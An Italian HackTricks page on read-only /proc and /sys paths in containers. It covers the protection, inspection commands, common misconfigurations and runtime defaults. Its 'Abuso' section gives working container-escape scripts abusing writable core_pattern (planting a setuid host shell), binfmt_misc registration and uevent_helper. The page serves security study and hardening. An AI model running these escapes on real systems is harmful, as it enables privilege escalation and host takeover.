# Percorsi di sistema in sola lettura

{{#include ../../../../banners/hacktricks-training.md}}

I percorsi di sistema in sola lettura sono una protezione separata dai masked paths. Invece di nascondere completamente un percorso, il runtime lo espone ma lo monta in sola lettura. Questo è comune per determinate posizioni procfs e sysfs, dove l'accesso in lettura può essere accettabile o necessario per il funzionamento, mentre le scritture sarebbero troppo pericolose.

Lo scopo è semplice: molte interfacce del kernel diventano molto più pericolose quando sono scrivibili. Un mount in sola lettura non rimuove tutto il valore di ricognizione, ma impedisce a un workload compromesso di modificare i file sottostanti esposti dal kernel attraverso quel percorso.

## Funzionamento

I runtime contrassegnano frequentemente parti della vista proc/sys come di sola lettura. A seconda del runtime e dell'host, ciò può includere percorsi come:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

L'elenco effettivo varia, ma il modello è lo stesso: consentire la visibilità dove necessario e negare la modifica per impostazione predefinita.<sup>[[1]](#references)</sup>

## Laboratorio

Ispeziona l'elenco dei percorsi in sola lettura dichiarato da Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Ispeziona la vista proc/sys montata dall'interno del container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impatto sulla sicurezza

I percorsi di sistema in sola lettura limitano un'ampia classe di abusi che possono avere un impatto sull'host. Anche quando un attacker può ispezionare procfs o sysfs, l'impossibilità di scrivervi elimina molti percorsi di modifica diretta che coinvolgono kernel tunables, crash handler, module-loading helper o altre interfacce di controllo. L'esposizione non scompare, ma il passaggio dall'information disclosure all'influenza sull'host diventa più difficile.

## Misconfigurazioni

Gli errori principali consistono nel rimuovere il masking o nel rimontare percorsi sensibili in modalità read-write, nell'esporre direttamente i contenuti di proc/sys dell'host tramite bind mount scrivibili oppure nell'utilizzare modalità privileged che di fatto aggirano i default più sicuri del runtime. In Kubernetes, `procMount: Unmasked` e i workload privileged sono spesso associati a una protezione più debole di proc.<sup>[[2]](#references)</sup> Un altro errore operativo comune consiste nel presumere che, poiché il runtime normalmente monta questi percorsi in sola lettura, tutti i workload ereditino ancora quel default.

## Abuso

Se la protezione è debole, inizia cercando entry proc/sys scrivibili:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Quando sono presenti voci scrivibili, i percorsi di follow-up ad alto valore includono:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Cosa possono rivelare questi comandi:

- Le voci scrivibili sotto `/proc/sys` spesso indicano che il container può modificare il comportamento del kernel dell'host, non semplicemente ispezionarlo.
- `core_pattern` è particolarmente importante perché un valore scrivibile esposto all'host può essere trasformato in un percorso di code execution sull'host causando il crash di un processo dopo aver impostato un pipe handler.
- `modprobe` rivela l'helper utilizzato dal kernel per i flussi correlati al caricamento dei moduli; è un target classico di alto valore quando è scrivibile.
- `binfmt_misc` indica se è possibile registrare interpreter personalizzati. Se la registrazione è scrivibile, può diventare una execution primitive anziché una semplice information leak.
- `panic_on_oom` controlla una decisione del kernel a livello dell'intero host e può quindi trasformare l'esaurimento delle risorse in un denial of service dell'host.
- `uevent_helper` è uno degli esempi più chiari di un percorso helper scrivibile in sysfs che produce code execution nel contesto dell'host.

Tra i risultati interessanti ci sono le proc knobs o le voci sysfs esposte all'host e scrivibili, che normalmente dovrebbero essere di sola lettura. A quel punto, il workload è passato da una visualizzazione limitata del container a un'influenza significativa sul kernel.

### Esempio completo: `core_pattern` Host Escape

Se `/proc/sys/kernel/core_pattern` è scrivibile dall'interno del container e punta alla visualizzazione del kernel dell'host, può essere abusato per eseguire un payload dopo un crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Se il path raggiunge effettivamente il kernel host, il payload viene eseguito sull'host e lascia una shell setuid.

### Esempio completo: registrazione `binfmt_misc`

Se `/proc/sys/fs/binfmt_misc/register` è scrivibile, la registrazione di un interpreter personalizzato può produrre code execution quando viene eseguito il file corrispondente:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Su un `binfmt_misc` scrivibile ed esposto all'host, il risultato è l'esecuzione di codice nel percorso dell'interprete attivato dal kernel.

### Esempio completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel può invocare un helper in un percorso dell'host quando viene attivato un evento corrispondente:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Il motivo per cui questo è così pericoloso è che il percorso dell'helper viene risolto dalla prospettiva del filesystem dell'host, anziché da un contesto sicuro limitato al container.

## Controlli

Questi controlli determinano se l'esposizione di procfs/sysfs è in sola lettura dove previsto e se il workload può ancora modificare interfacce sensibili del kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Cosa è interessante qui:

- Un workload hardened normale dovrebbe esporre pochissime entry proc/sys scrivibili.
- I percorsi `/proc/sys` scrivibili sono spesso più importanti del semplice accesso in lettura.
- Se il runtime indica che un percorso è in sola lettura, ma in pratica è scrivibile, esamina attentamente la mount propagation, i bind mount e le impostazioni dei privilegi.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita | Docker definisce un elenco predefinito di percorsi in sola lettura per le entry proc sensibili | esposizione dei mount proc/sys dell'host, `--privileged` |
| Podman | Abilitato per impostazione predefinita | Podman applica percorsi predefiniti in sola lettura, salvo rilassamento esplicito | `--security-opt unmask=ALL`, mount estesi dell'host, `--privileged` |
| Kubernetes | Eredita le impostazioni predefinite del runtime | Utilizza il modello di percorsi in sola lettura del runtime sottostante, salvo indebolimento tramite le impostazioni del Pod o i mount dell'host | `procMount: Unmasked`, workload privilegiati, mount proc/sys dell'host scrivibili |
| containerd / CRI-O sotto Kubernetes | Impostazione predefinita del runtime | Di solito si basa sulle impostazioni predefinite OCI/runtime | come nella riga Kubernetes; le modifiche dirette alla configurazione del runtime possono indebolire il comportamento |

Il punto chiave è che i percorsi di sistema in sola lettura sono solitamente presenti come impostazione predefinita del runtime, ma sono facili da compromettere tramite modalità privilegiate o bind mount dell'host.

## Riferimenti

- [1] [OCI Runtime Specification: Linux Container Configuration (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Kubernetes API Reference: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
